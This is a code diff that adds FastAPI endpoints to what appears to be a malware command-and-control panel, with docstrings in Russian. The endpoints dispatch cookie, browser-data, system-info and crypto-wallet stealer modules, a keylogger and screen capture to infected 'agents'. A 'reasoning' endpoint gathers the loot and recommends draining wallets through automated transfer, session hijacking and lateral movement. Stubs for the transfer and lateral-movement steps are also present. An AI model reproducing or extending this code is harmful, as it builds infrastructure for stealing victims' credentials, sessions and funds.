+    """Запуск модуля кражи cookies для агента"""
+    try:
+        loader = ModuleLoader()
+        result = loader.run_module("browser_stealer")
+        return {"status": "success", "result": result}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@app.post("/api/agent/{agent_id}/browser/steal")
+async def steal_browser_data(agent_id: str):
+    """Запуск модуля кражи browser data для агента"""
+    try:
+        loader = ModuleLoader()
+        result = loader.run_module("browser_stealer")
+        return {"status": "success", "result": result}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@app.post("/api/agent/{agent_id}/system/steal")
+async def steal_system_info(agent_id: str):
+    """Запуск модуля сбора системной информации для агента"""
+    try:
+        loader = ModuleLoader()
+        result = loader.run_module("system_stealer")
+        return {"status": "success", "result": result}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@app.post("/api/agent/{agent_id}/keylogger/start")
+async def start_keylogger(agent_id: str):
+    """Запуск keylogger для агента"""
+    try:
+        loader = ModuleLoader()
+        result = loader.run_module("keylogger", action="start")
+        return {"status": "success", "result": result}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@app.post("/api/agent/{agent_id}/vnc/start")
+async def start_vnc(agent_id: str):
+    """Запуск screen/VNC модуля для агента (пока через screen_capture)"""
+    try:
+        loader = ModuleLoader()
+        result = loader.run_module("screen_capture")
+        return {"status": "success", "result": result}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+@app.post("/api/agent/{agent_id}/ats/run")
+async def run_ats(agent_id: str):
+    """Запуск ATS (автоматизированный перевод средств) — пока заглушка"""
+    return {"status": "error", "message": "ATS module not implemented"}
+
+@app.post("/api/agent/{agent_id}/lateral-move")
+async def lateral_move(agent_id: str):
+    """Попытка lateral movement — пока заглушка"""
+    return {"status": "error", "message": "Lateral movement module not implemented"}
+
+@app.post("/api/agent/{agent_id}/reasoning")
+async def agent_reasoning(agent_id: str):
+    """Анализирует результаты модулей и предлагает дальнейшие действия"""
+    try:
+        # Собираем результаты модулей (если есть)
+        loader = ModuleLoader()
+        loot = {}
+        loot["wallets"] = loader.run_module("crypto_stealer")
+        loot["cookies"] = loader.run_module("browser_stealer")
+        loot["system"] = loader.run_module("system_stealer")
+        # Анализируем лут и формируем рекомендации
+        recommendations = []
+        if loot["wallets"].get("summary", {}).get("wallets_found", 0) > 0:
+            recommendations.append("Выполнить ATS (автоматизированный перевод средств) или выгрузить кошельки.")
+        if loot["cookies"].get("summary", {}).get("cookies_found", 0) > 0:
+            recommendations.append("Попробовать session hijack или использовать cookies для доступа к сервисам.")
+        if loot["system"].get("summary", {}).get("user_accounts", 0) > 1:
+            recommendations.append("Попробовать lateral movement через найденные учётки.")
+        if not recommendations:
+            recommendations.append("Собрать больше данных или попробовать другие модули.")
+        # Возвращаем reasoning-логи и рекомендации
+        return {
+            "status": "success",
+            "loot": loot,
+            "recommendations": recommendations,
+            "reasoning_logs": reasoning_logs[-20:]  # последние 20 логов
+        }
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
